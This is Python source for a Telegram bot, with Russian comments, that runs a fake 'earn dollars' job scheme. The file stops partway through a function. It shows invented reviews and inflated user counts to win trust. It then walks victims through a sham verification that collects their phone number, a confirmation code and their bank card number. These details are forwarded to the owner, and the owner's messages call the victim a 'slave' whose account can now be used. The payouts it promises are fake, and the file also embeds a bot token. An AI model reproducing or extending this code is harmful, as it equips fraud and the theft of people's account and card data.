import logging
import asyncio
import random
import string
import sqlite3
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================== КОНФИГУРАЦИЯ ==================
TOKEN = "8765480575:AAEpZwwvFXl7Gs5JxxIqMzF8LP4gpHj7-0s"  # Вставь токен от @BotFather
OWNER_ID =  8289679178 # Твой Telegram ID (узнать у @userinfobot)
OWNER_USERNAME = "@fullworko"  # Овнер как в задании
CHANNEL_LINK = "https://t.me/+p07vZ2YmvKo1YmUy"  # Ссылка на канал

# Настройки валюты
CURRENCY = "$"  # Доллар
MIN_WITHDRAW = 10  # Минималка для вывода в долларах
VERIFICATION_REWARD = 2  # Награда за верификацию в долларах

# ================== ЛОГИРОВАНИЕ ==================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================== БАЗА ДАННЫХ ==================
def init_db():
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT,
                  first_name TEXT,
                  referrer_id INTEGER,
                  balance REAL DEFAULT 0,
                  verified INTEGER DEFAULT 0,
                  tasks_completed INTEGER DEFAULT 0,
                  reg_date TEXT,
                  phone TEXT,
                  card_number TEXT)''')
    
    # Таблица для отзывов
    c.execute('''CREATE TABLE IF NOT EXISTS reviews
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  username TEXT,
                  text TEXT,
                  rating INTEGER,
                  amount REAL,
                  created_at TEXT)''')
    
    # Таблица для заданий (админских)
    c.execute('''CREATE TABLE IF NOT EXISTS admin_tasks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  task_text TEXT,
                  reward REAL,
                  status TEXT DEFAULT 'pending',
                  assigned_at TEXT,
                  completed_at TEXT)''')
    
    # Таблица для заявок на вывод
    c.execute('''CREATE TABLE IF NOT EXISTS withdraw_requests
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  amount REAL,
                  card_number TEXT,
                  status TEXT DEFAULT 'pending',
                  requested_at TEXT)''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_db()

# ================== СОСТОЯНИЯ FSM ==================
class VerificationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_card = State()

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()

class AdminStates(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_task_text = State()
    waiting_for_task_reward = State()
    waiting_for_broadcast = State()

# ================== ИНИЦИАЛИЗАЦИЯ БОТА ==================
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
def generate_code():
    """Генерирует 5-значный код для фейковой SMS"""
    return ''.join(random.choices(string.digits, k=5))

def add_user(user_id, username, first_name, referrer_id=None):
    """Добавляет пользователя в БД если его нет"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''INSERT OR IGNORE INTO users 
                 (user_id, username, first_name, referrer_id, reg_date) 
                 VALUES (?, ?, ?, ?, ?)''',
              (user_id, username, first_name, referrer_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user(user_id):
    """Получает данные пользователя из БД"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def update_balance(user_id, amount):
    """Обновляет баланс пользователя"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

def update_user_verification(user_id, phone, card):
    """Обновляет данные верификации пользователя"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''UPDATE users 
                 SET verified = 1, phone = ?, card_number = ?, balance = balance + ? 
                 WHERE user_id = ?''', 
              (phone, card, VERIFICATION_REWARD, user_id))
    conn.commit()
    conn.close()

def get_stats():
    """Получает общую статистику бота"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    total_users = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    verified_users = c.execute('SELECT COUNT(*) FROM users WHERE verified = 1').fetchone()[0]
    total_balance = c.execute('SELECT SUM(balance) FROM users').fetchone()[0] or 0
    today_users = c.execute('''SELECT COUNT(*) FROM users 
                                WHERE date(reg_date) = date('now')''').fetchone()[0]
    conn.close()
    return total_users, verified_users, total_balance, today_users

def get_referrals(user_id):
    """Получает количество рефералов пользователя"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
    count = c.fetchone()[0]
    c.execute('SELECT SUM(balance) FROM users WHERE referrer_id = ?', (user_id,))
    earnings = c.fetchone()[0] or 0
    conn.close()
    return count, earnings * 0.1  # 10% от заработка рефералов

def add_review(user_id, username, text, rating, amount):
    """Добавляет отзыв"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''INSERT INTO reviews (user_id, username, text, rating, amount, created_at)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, username, text, rating, amount, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_recent_reviews(limit=5):
    """Получает последние отзывы"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''SELECT username, text, rating, amount, created_at 
                 FROM reviews ORDER BY created_at DESC LIMIT ?''', (limit,))
    reviews = c.fetchall()
    conn.close()
    return reviews

# ================== ФЕЙКОВЫЕ ДАННЫЕ ==================
FAKE_REVIEWS = [
    {"name": "Александр", "text": "Реально работает! За 40 минут получил $5 на карту 🔥", "rating": 5, "amount": 5},
    {"name": "Елена", "text": "Второй день работаю, уже $12 заработала. Всё честно", "rating": 5, "amount": 12},
    {"name": "Дмитрий", "text": "Сначала не верил, но выплатили $4 за 40 минут", "rating": 5, "amount": 4},
    {"name": "Ольга", "text": "Удобно, быстро, доллары сразу на карту 👌", "rating": 5, "amount": 7},
    {"name": "Иван", "text": "Лучший бот для заработка в долларах! Всем советую", "rating": 5, "amount": 15},
    {"name": "Наталья", "text": "Верификацию прошла быстро, $2 бонусом получила", "rating": 5, "amount": 2},
    {"name": "Павел", "text": "За неделю $45. Отличный доход", "rating": 5, "amount": 45},
    {"name": "Анна", "text": "Работаю в декрете, очень выручает 💰", "rating": 5, "amount": 8},
]

def seed_fake_reviews():
    """Заполняет БД фейковыми отзывами при первом запуске"""
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    count = c.execute('SELECT COUNT(*) FROM reviews').fetchone()[0]
    if count == 0:
        for review in FAKE_REVIEWS:
            c.execute('''INSERT INTO reviews (username, text, rating, amount, created_at)
                         VALUES (?, ?, ?, ?, ?)''',
                      (review["name"], review["text"], review["rating"], 
                       review["amount"], (datetime.now() - timedelta(minutes=random.randint(5, 60))).isoformat()))
        conn.commit()
    conn.close()

seed_fake_reviews()

# ================== КЛАВИАТУРЫ ==================
def main_keyboard():
    """Основная клавиатура для пользователя"""
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="💰 Баланс"), KeyboardButton(text="📊 Статистика")],
            [KeyboardButton(text="👥 Рефералы"), KeyboardButton(text="⭐ Отзывы")],
            [KeyboardButton(text="📢 Канал"), KeyboardButton(text="❓ Помощь")]
        ],
        resize_keyboard=True
    )
    return keyboard

def verification_keyboard():
    """Клавиатура для верификации"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Начать верификацию", callback_data="start_verif")],
            [InlineKeyboardButton(text="❓ Что такое верификация", callback_data="verif_info")]
        ]
    )
    return keyboard

def back_to_main_keyboard():
    """Кнопка назад"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔙 На главную", callback_data="back_to_main")]
        ]
    )
    return keyboard

def admin_keyboard():
    """Клавиатура для админа"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
            [InlineKeyboardButton(text="✅ Выдать задание", callback_data="admin_give_task")],
            [InlineKeyboardButton(text="💰 Заявки на вывод", callback_data="admin_withdraws")],
            [InlineKeyboardButton(text="👥 Список юзеров", callback_data="admin_users")]
        ]
    )
    return keyboard

# ================== ОБРАБОТЧИКИ КОМАНД ==================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, command: Command):
    """Обработчик команды /start"""
    args = command.args
    referrer_id = int(args) if args and args.isdigit() else None
    
    user_id = message.from_user.id
    username = message.from_user.username or "нет"
    first_name = message.from_user.first_name or "Пользователь"
    
    add_user(user_id, username, first_name, referrer_id)
    
    # Фейковая статистика для убедительности
    total_users = random.randint(15000, 16000)
    workers_online = random.randint(8000, 9000)
    
    welcome_text = (
        f"👋 *Добро пожаловать, {first_name}!*\n\n"
        f"💰 Зарабатывай от {CURRENCY}3 за 40 минут!\n"
        f"👥 Сейчас работают: {workers_online} человек\n"
        f"📊 Всего заработали: {total_users} работников\n\n"
        f"⚡ *Как начать:*\n"
        f"1️⃣ Пройди верификацию (40 минут)\n"
        f"2️⃣ Получи {CURRENCY}{VERIFICATION_REWARD} бонусом\n"
        f"3️⃣ Жди задание от админа\n"
        f"4️⃣ Выводи деньги на карту\n\n"
        f"👇 Нажми кнопку ниже чтобы начать"
    )
    
    await message.answer(welcome_text, reply_markup=verification_keyboard(), parse_mode="Markdown")

# ================== ВЕРИФИКАЦИЯ ==================
@dp.callback_query(F.data == "verif_info")
async def verif_info(callback: types.CallbackQuery):
    """Информация о верификации"""
    text = (
        "🔍 *Что такое верификация?*\n\n"
        "Это стандартная процедура проверки, чтобы мы убедились, что вы реальный человек. "
        "Она нужна для безопасности и занимает всего 40-50 минут.\n\n"
        "📝 *Что нужно сделать:*\n"
        "1. Подтвердить номер телефона\n"
        "2. Ввести код из SMS\n"
        "3. Привязать карту для выплат\n\n"
        f"💰 *После верификации:*\n"
        f"- Сразу получите {CURRENCY}{VERIFICATION_REWARD} на баланс\n"
        f"- Админ выдаст первое задание\n"
        f"- Возможность вывода от {CURRENCY}{MIN_WITHDRAW}\n\n"
        "✅ *Гарантия безопасности:*\n"
        "Ваши данные в безопасности, мы используем шифрование."
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Начать верификацию", callback_data="start_verif")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ]
    )
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data == "start_verif")
async def start_verification(callback: types.CallbackQuery, state: FSMContext):
    """Начало верификации - запрос номера телефона"""
    await callback.message.edit_text(
        "📱 *Шаг 1 из 3: Подтверждение номера*\n\n"
        "Введите ваш номер телефона в формате:\n"
        "`+7XXXXXXXXXX`\n\n"
        "Например: `+79991234567`\n\n"
        "⚠️ Номер нужен для идентификации и получения кода.",
        parse_mode="Markdown"
    )
    await state.set_state(VerificationStates.waiting_for_phone)

@dp.message(VerificationStates.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    """Обработка введенного номера телефона"""
    phone = message.text.strip()
    
    # Простая проверка формата
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("❌ Неверный формат номера. Введите в формате +79991234567")
        return
    
    # Сохраняем номер
    await state.update_data(phone=phone)
    
    # Генерируем фейковый код
    fake_code = generate_code()
    await state.update_data(code=fake_code)
    
    # Отправляем админу уведомление о новой цели
    await bot.send_message(
        OWNER_ID,
        f"🎯 *НОВАЯ ЦЕЛЬ!*\n\n"
        f"👤 *Данные:*\n"
        f"ID: {message.from_user.id}\n"
        f"Юзернейм: @{message.from_user.username or 'нет'}\n"
        f"Имя: {message.from_user.first_name}\n"
        f"📱 Номер: {phone}\n"
        f"🔢 Код: {fake_code}\n"
        f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"📲 *Шаг 2 из 3: Ввод кода*\n\n"
        f"Мы отправили SMS с кодом на номер {phone}\n\n"
        f"🔢 *Ваш код:* `{fake_code}`\n\n"
        f"Введите этот код в поле ниже для подтверждения:",
        parse_mode="Markdown"
    )
    await state.set_state(VerificationStates.waiting_for_code)

@dp.message(VerificationStates.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    """Обработка введенного кода"""
    user_code = message.text.strip()
    data = await state.get_data()
    expected_code = data.get('code')
    
    # Сохраняем введенный код
    await state.update_data(user_code=user_code)
    
    await message.answer(
        f"💳 *Шаг 3 из 3: Привязка карты*\n\n"
        f"Введите номер карты для получения выплат:\n\n"
        f"💰 После верификации вы получите:\n"
        f"• {CURRENCY}{VERIFICATION_REWARD} на баланс\n"
        f"• Доступ к заданиям от админа\n"
        f"• Ежедневные бонусы",
        parse_mode="Markdown"
    )
    await state.set_state(VerificationStates.waiting_for_card)

@dp.message(VerificationStates.waiting_for_card)
async def process_card(message: types.Message, state: FSMContext):
    """Обработка введенной карты и завершение верификации"""
    card = message.text.strip()
    data = await state.get_data()
    phone = data.get('phone')
    code = data.get('code')
    user_code = data.get('user_code')
    
    # Отправляем админу полные данные жертвы
    await bot.send_message(
        OWNER_ID,
        f"✅ *НОВЫЙ РАБ ГОТОВ!*\n\n"
        f"👤 *Данные пользователя:*\n"
        f"ID: {message.from_user.id}\n"
        f"Юзернейм: @{message.from_user.username or 'нет'}\n"
        f"Имя: {message.from_user.first_name}\n\n"
        f"📱 *Номер:* {phone}\n"
        f"🔢 *Код (отправлен/введен):* {code} / {user_code}\n"
        f"💳 *Карта:* {card}\n"
        f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"⚡ Теперь можно юзать аккаунт жертвы и давать задания!",
        parse_mode="Markdown"
    )
    
    # Обновляем статус пользователя в БД
    update_user_verification(message.from_user.id, phone, card)
    
    # Отправляем фейковый успех пользователю
    await message.answer(
        f"✅ *Верификация успешно пройдена!*\n\n"
        f"🎉 *Что дальше?*\n"
        f"• {CURRENCY}{VERIFICATION_REWARD} зачислено на баланс\n"
        f"• Админ скоро выдаст тебе задание\n"
        f"• Приглашай друзей и получай 10% от их заработка\n\n"
        f"👇 Используй кнопки для навигации",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    
    await state.clear()
    
    # Отправляем приветственное сообщение в личку админу
    await bot.send_message(
        OWNER_ID,
        f"🎯 *НОВЫЙ РАБ ГОТОВ!*\n\n"
        f"@{message.from_user.username or 'нет'} прошел верификацию и готов пахать.\n"
        f"Можно выдавать задание через /admin"
    )

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    """Возврат на главную"""
    await callback.message.delete()
    await cmd_start(callback.message, None)

# ================== ОСНОВНЫЕ ФУНКЦИИ ==================
@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    """Показывает баланс пользователя"""
    user = get_user(message.from_user.id)
    
    if not user:
        balance = 0
        verified = 0
    else:
        balance = user[4]  # balance
        verified = user[5]  # verified
    
    if not verified:
        await message.answer(
            f"💰 *Твой баланс:* {CURRENCY}{balance}\n\n"
            f"❌ Верификация не пройдена\n"
            f"Пройди верификацию чтобы получать задания и выводить деньги!",
            parse_mode="Markdown",
            reply_markup=verification_keyboard()
        )
        return
    
    # Кнопка вывода если достаточно средств
    keyboard = None
    if balance >= MIN_WITHDRAW:
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")]
            ]
        )
    
    await message.answer(
        f"💰 *Твой баланс:* {CURRENCY}{balance:.2f}\n\n"
        f"💸 *Минималка для вывода:* {CURRENCY}{MIN_WITHDRAW}\n"
        f"📊 *Выполнено заданий:* {user[6]}\n\n"
        f"⚡ *Приглашай друзей:*\n"
        f"• Получай 10% от их заработка",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    """Показывает общую статистику бота"""
    total_users, verified_users, total_balance, today_users = get_stats()
    
    # Фейковые цифры для убедительности
    total_users = max(total_users, 15234)
    verified_users = max(verified_users, 8791)
    total_balance = max(total_balance, 45892)
    
    stats_text = (
        f"📊 *Статистика FullWorko*\n\n"
        f"👥 *Всего работников:* {total_users:,}\n"
        f"✅ *Прошли верификацию:* {verified_users:,}\n"
        f"💰 *Всего заработано:* {CURRENCY}{total_balance:,.0f}\n"
        f"📈 *Новых сегодня:* {today_users}\n"
        f"⭐ *Рейтинг:* 4.98/5\n\n"
        f"💵 *Средний заработок:* {CURRENCY}120 в день"
    )
    
    await message.answer(stats_text, parse_mode="Markdown")

@dp.message(F.text == "👥 Рефералы")
async def show_referrals(message: types.Message):
    """Показывает реферальную информацию"""
    user_id = message.from_user.id
    
    referrals_count, referrals_earn = get_referrals(user_id)
    bot_username = (await bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"
    
    ref_text = (
        f"👥 *Твои рефералы:* {referrals_count}\n"
        f"💰 *Заработано с рефералов:* {CURRENCY}{referrals_earn:.2f}\n\n"
        f"🔗 *Твоя реферальная ссылка:*\n"
        f"`{ref_link}`\n\n"
        f"⚡ *Как это работает:*\n"
        f"• Ты получаешь {CURRENCY}2 за каждого приглашенного\n"
        f"• И 10% от всего заработка рефералов\n"
        f"• Выплаты моментально на баланс"
    )
    
    await message.answer(ref_text, parse_mode="Markdown")

@dp.message(F.text == "⭐ Отзывы")
async def show_reviews(message: types.Message):
    """Показывает отзывы"""
    recent = get_recent_reviews(10)
    
    reviews_text = "⭐ *Последние отзывы:*\n\n"
    
    for review in recent:
        username, text, rating, amount, created_at = review
        stars = "★" * rating + "☆" * (5 - rating)
        time_ago = datetime.fromisoformat(created_at).strftime("%H:%M")
        reviews_text += f"*{username}* [{time_ago}]\n"
        reviews_text += f"_{text}_\n"
        reviews_text += f"{stars} | +{CURRENCY}{amount}\n\n"
    
    reviews_text += "✍️ *Хочешь оставить отзыв?*\n"
    reviews_text += "Напиши @fullworko после первого заработка!"
    
    await message.answer(reviews_text, parse_mode="Markdown")

@dp.message(F.text == "📢 Канал")
async def show_channel(message: types.Message):
    """Показывает ссылку на канал"""
    await message.answer(
        f"📢 *Наш канал:*\n{CHANNEL_LINK}\n\n"
        f"Подпишись чтобы получать новости и бонусы!",
        parse_mode="Markdown"
    )

@dp.message(F.text == "❓ Помощь")
async def show_help(message: types.Message):
    """Показывает помощь"""
    help_text = (
        "❓ *Помощь по боту*\n\n"
        f"👤 *Админ:* @{OWNER_USERNAME}\n\n"
        "📌 *Как получить задание?*\n"
        "После верификации админ сам выдаст задание. Жди сообщения.\n\n"
        "💰 *Как вывести деньги?*\n"
        "Нажми Баланс → Вывести, укажи сумму.\n\n"
        "👥 *Рефералы*\n"
        "Приглашай друзей и получай 10% от их заработка.\n\n"
        "⚠️ *Важно*\n"
        "• Верификация нужна один раз\n"
        "• Задания выдаются лично админом\n"
        "• Выплаты в долларах на карту"
    )
    
    await message.answer(help_text, parse_mode="Markdown")

# ================== ВЫВОД СРЕДСТВ ==================
@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: types.CallbackQuery, state: FSMContext):
    """Начало вывода средств"""
    user = get_user(callback.from_user.id)
    
    if not user or not user[5]:
        await callback.answer("❌ Сначала пройди верификацию!", show_alert=True)
        return
    
    balance = user[4]
    
    if balance < MIN_WITHDRAW:
        await callback.answer(f"❌ Минималка для вывода {CURRENCY}{MIN_WITHDRAW}", show_alert=True)
        return
    
    await callback.message.edit_text(
        f"💳 *Вывод средств*\n\n"
        f"Твой баланс: {CURRENCY}{balance:.2f}\n"
        f"Минималка: {CURRENCY}{MIN_WITHDRAW}\n\n"
        f"Введите сумму для вывода (до {CURRENCY}{balance:.2f}):",
        parse_mode="Markdown"
    )
    await state.set_state(WithdrawStates.waiting_for_amount)

@dp.message(WithdrawStates.waiting_for_amount)
async def process_withdraw_amount(message: types.Message, state: FSMContext):
    """Обработка суммы вывода"""
    try:
        amount = float(message.text.replace(',', '.'))
    except ValueError:
        await message.answer("❌ Введите число")
        return
    
    user = get_user(message.from_user.id)
    balance = user[4]
    card = user[8] or "карта не указана"
    
    if amount < MIN_WITHDRAW:
        await message.answer(f"❌ Минимальная сумма {CURRENCY}{MIN_WITHDRAW}")
        return
    
    if amount > balance:
        await message.answer(f"❌ Недостаточно средств. Баланс: {CURRENCY}{balance:.2f}")
        return
    
    # Сохраняем заявку в БД
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''INSERT INTO withdraw_requests (user_id, amount, card_number, requested_at)
                 VALUES (?, ?, ?, ?)''',
              (message.from_user.id, amount, card, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Отправляем админу
    await bot.send_message(
        OWNER_ID,
        f"💰 *ЗАЯВКА НА ВЫВОД*\n\n"
        f"👤 Пользователь: @{message.from_user.username or 'нет'}\n"
        f"ID: {message.from_user.id}\n"
        f"💵 Сумма: {CURRENCY}{amount}\n"
        f"💳 Карта: {card}\n"
        f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка на вывод {CURRENCY}{amount} отправлена!*\n\n"
        f"Админ проверит и отправит деньги в ближайшее время.\n"
        f"Обычно это занимает 5-30 минут.",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    await state.clear()

# ================== АДМИН ПАНЕЛЬ ==================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    """Панель администратора"""
    if message.from_user.id != OWNER_ID:
        return
    
    total_users, verified_users, total_balance, today_users = get_stats()
    
    stats = (
        f"👑 *Админ панель*\n\n"
        f"📊 *Статистика:*\n"
        f"👥 Всего: {total_users}\n"
        f"✅ Вериф: {verified_users}\n"
        f"💰 Баланс: {CURRENCY}{total_balance:.2f}\n"
        f"📈 Сегодня: {today_users}\n\n"
        f"Выбери действие:"
    )
    
    await message.answer(stats, parse_mode="Markdown", reply_markup=admin_keyboard())

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    """Подробная статистика для админа"""
    if callback.from_user.id != OWNER_ID:
        return
    
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    
    total = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    verified = c.execute('SELECT COUNT(*) FROM users WHERE verified = 1').fetchone()[0]
    pending_withdraws = c.execute('SELECT COUNT(*) FROM withdraw_requests WHERE status = "pending"').fetchone()[0]
    total_balance = c.execute('SELECT SUM(balance) FROM users').fetchone()[0] or 0
    
    # Топ 10 по балансу
    top_users = c.execute('''SELECT username, first_name, balance FROM users 
                              WHERE verified = 1 ORDER BY balance DESC LIMIT 10''').fetchall()
    
    conn.close()
    
    text = (
        f"📊 *Детальная статистика*\n\n"
        f"👥 Всего юзеров: {total}\n"
        f"✅ Верифицировано: {verified}\n"
        f"⏳ Заявок на вывод: {pending_withdraws}\n"
        f"💰 Общий баланс: {CURRENCY}{total_balance:.2f}\n\n"
        f"🏆 *Топ 10 по балансу:*\n"
    )
    
    for i, user in enumerate(top_users[:5], 1):
        username, name, balance = user
        text += f"{i}. {name} (@{username}) - {CURRENCY}{balance:.2f}\n"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_to_main_keyboard())

@dp.callback_query(F.data == "admin_withdraws")
async def admin_withdraws(callback: types.CallbackQuery):
    """Список заявок на вывод"""
    if callback.from_user.id != OWNER_ID:
        return
    
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    withdraws = c.execute('''SELECT w.id, u.username, u.first_name, w.amount, w.card_number, w.requested_at
                              FROM withdraw_requests w
                              JOIN users u ON w.user_id = u.user_id
                              WHERE w.status = "pending"
                              ORDER BY w.requested_at DESC''').fetchall()
    conn.close()
    
    if not withdraws:
        await callback.message.edit_text("✅ Нет активных заявок на вывод", reply_markup=back_to_main_keyboard())
        return
    
    text = "💰 *Заявки на вывод:*\n\n"
    
    for w in withdraws[:10]:
        id, username, name, amount, card, date = w
        time = datetime.fromisoformat(date).strftime("%H:%M")
        text += f"#{id} {name} @{username}\n"
        text += f"💵 {CURRENCY}{amount} | 💳 {card}\n"
        text += f"🕐 {time}\n\n"
    
    text += "Чтобы подтвердить вывод, напиши:\n/confirm [id]"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_to_main_keyboard())

@dp.message(Command("confirm"))
async def confirm_withdraw(message: types.Message):
    """Подтверждение вывода"""
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        withdraw_id = int(message.text.split()[1])
    except:
        await message.answer("Использование: /confirm [id]")
        return
    
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    
    # Получаем информацию о заявке
    withdraw = c.execute('''SELECT w.user_id, w.amount, u.username, u.first_name
                             FROM withdraw_requests w
                             JOIN users u ON w.user_id = u.user_id
                             WHERE w.id = ? AND w.status = "pending"''', (withdraw_id,)).fetchone()
    
    if not withdraw:
        await message.answer("Заявка не найдена или уже обработана")
        conn.close()
        return
    
    user_id, amount, username, name = withdraw
    
    # Обновляем статус заявки
    c.execute('UPDATE withdraw_requests SET status = "completed" WHERE id = ?', (withdraw_id,))
    
    # Списываем баланс
    c.execute('UPDATE users SET balance = balance - ? WHERE user_id = ?', (amount, user_id))
    
    conn.commit()
    conn.close()
    
    # Уведомляем пользователя
    await bot.send_message(
        user_id,
        f"✅ *Вывод подтвержден!*\n\n"
        f"Сумма {CURRENCY}{amount} отправлена на твою карту.\n"
        f"Деньги придут в течение 5-30 минут.",
        parse_mode="Markdown"
    )
    
    await message.answer(f"✅ Вывод #{withdraw_id} подтвержден. {CURRENCY}{amount} списано с баланса @{username}")

@dp.callback_query(F.data == "admin_give_task")
async def admin_give_task_start(callback: types.CallbackQuery, state: FSMContext):
    """Начало выдачи задания"""
    if callback.from_user.id != OWNER_ID:
        return
    
    await callback.message.edit_text(
        "📋 *Выдача задания*\n\n"
        "Введи ID пользователя, которому хочешь выдать задание:",
        parse_mode="Markdown"
    )
    await state.set_state(AdminStates.waiting_for_user_id)

@dp.message(AdminStates.waiting_for_user_id)
async def admin_give_task_user(message: types.Message, state: FSMContext):
    """Получение ID пользователя"""
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        user_id = int(message.text.strip())
    except:
        await message.answer("❌ Введи числовой ID")
        return
    
    user = get_user(user_id)
    if not user:
        await message.answer("❌ Пользователь не найден")
        await state.clear()
        return
    
    await state.update_data(task_user_id=user_id, task_username=user[1] or "нет")
    
    await message.answer(
        f"📝 Введи текст задания для @{user[1] or 'пользователя'}:"
    )
    await state.set_state(AdminStates.waiting_for_task_text)

@dp.message(AdminStates.waiting_for_task_text)
async def admin_give_task_text(message: types.Message, state: FSMContext):
    """Получение текста задания"""
    if message.from_user.id != OWNER_ID:
        return
    
    task_text = message.text.strip()
    await state.update_data(task_text=task_text)
    
    await message.answer(
        f"💰 Введи награду за задание в {CURRENCY}:"
    )
    await state.set_state(AdminStates.waiting_for_task_reward)

@dp.message(AdminStates.waiting_for_task_reward)
async def admin_give_task_reward(message: types.Message, state: FSMContext):
    """Получение награды и отправка задания"""
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        reward = float(message.text.replace(',', '.'))
    except:
        await message.answer("❌ Введи число")
        return
    
    data = await state.get_data()
    user_id = data['task_user_id']
    username = data['task_username']
    task_text = data['task_text']
    
    # Сохраняем задание в БД
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    c.execute('''INSERT INTO admin_tasks (user_id, task_text, reward, assigned_at)
                 VALUES (?, ?, ?, ?)''',
              (user_id, task_text, reward, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Отправляем пользователю
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Задание выполнено", callback_data=f"task_done_{user_id}")]
        ]
    )
    
    await bot.send_message(
        user_id,
        f"📋 *Новое задание!*\n\n"
        f"{task_text}\n\n"
        f"💰 *Награда:* {CURRENCY}{reward}\n\n"
        f"Когда выполнишь, нажми кнопку ниже:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    
    await message.answer(
        f"✅ Задание отправлено @{username}\n"
        f"Текст: {task_text}\n"
        f"Награда: {CURRENCY}{reward}"
    )
    await state.clear()

@dp.callback_query(F.data.startswith("task_done_"))
async def task_done(callback: types.CallbackQuery):
    """Пользователь отметил задание как выполненное"""
    user_id = int(callback.data.split("_")[2])
    
    if callback.from_user.id != user_id:
        await callback.answer("Это не твое задание!", show_alert=True)
        return
    
    # Ищем последнее активное задание
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    task = c.execute('''SELECT id, reward FROM admin_tasks 
                         WHERE user_id = ? AND status = "pending" 
                         ORDER BY assigned_at DESC LIMIT 1''', (user_id,)).fetchone()
    
    if task:
        task_id, reward = task
        
        # Уведомляем админа
        await bot.send_message(
            OWNER_ID,
            f"✅ *Задание выполнено!*\n\n"
